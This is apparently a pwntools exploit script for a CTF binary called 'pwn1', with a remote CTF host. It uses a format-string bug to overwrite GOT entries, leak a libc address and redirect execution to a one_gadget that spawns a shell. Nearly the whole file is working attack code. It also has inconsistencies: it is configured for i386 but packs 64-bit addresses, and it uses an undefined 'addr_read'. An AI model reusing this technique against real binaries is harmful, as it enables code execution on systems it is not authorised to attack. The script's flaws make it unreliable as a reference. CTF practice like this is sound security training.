from pwn import *
import sys

#import kmpwn
sys.path.append('/home/vagrant/kmpwn')
from kmpwn import *
#fsb(width, offset, data, padding, roop)

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = "./pwn1"
HOST = "79gq4l5zpv1aogjgw6yhhymi4.ctf.p0wnhub.com"
PORT = 11337

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process(FILE_NAME)

elf = ELF(FILE_NAME)
addr_main = elf.symbols["main"]
addr_target = 0x401156
addr_start = elf.symbols["_start"]
got_exit = elf.got["exit"]
got_read = elf.got["read"]
got_printf = elf.got["printf"]
got_fflush = elf.got["fflush"]
got_start_main = 0x403ff0
addr_dtor = 0x403e18
#addr_bss = elf.bss()
#addr_dynsym = elf.get_section_by_name('.dynsym').header['sh_addr']
#
libc = ELF('./libc.so')
off_printf = libc.symbols["printf"]
off_system = libc.symbols["system"]
#libc_binsh = next(libc.search("/bin/sh"))
gadget = [0x46428, 0x4647c, 0xe9415, 0xea36d]

def exploit():
	buf_off = 8
	
	payload = p64(got_exit)
	payload += p64(got_exit+2)
	payload += fsb(2, buf_off, addr_main, 0, 2)
	payload += "\x00"*(0x20-len(payload))
	conn.sendline(payload)
	conn.recv()	
	
	payload = p64(got_printf)
	payload += p64(got_read)
	payload += "%8$s,"
	payload += "\x00"*(0x20-len(payload))
	conn.send(payload)
	
	libc_printf = u64(conn.recvuntil(",")[-7:-1] + "\x00\x00")
	libc_base = libc_printf - off_printf
	print hex(libc_base)
	libc_system = libc_base + off_system
	one_gadget = libc_base + gadget[0]	
	
	#payload = p64(got_start_main)
	#payload += p64(0)
	#payload += "%8$s,"
	#conn.sendline(payload)
	
	payload = p64(addr_read)
	payload += p64(addr_read+2)
	payload += fsb(2, buf_off, one_gadget, 0, 1)
	payload += "\x00"*(0x20-len(payload))
	conn.send(payload)
		

	conn.interactive()	

if __name__ == "__main__":
	exploit()	
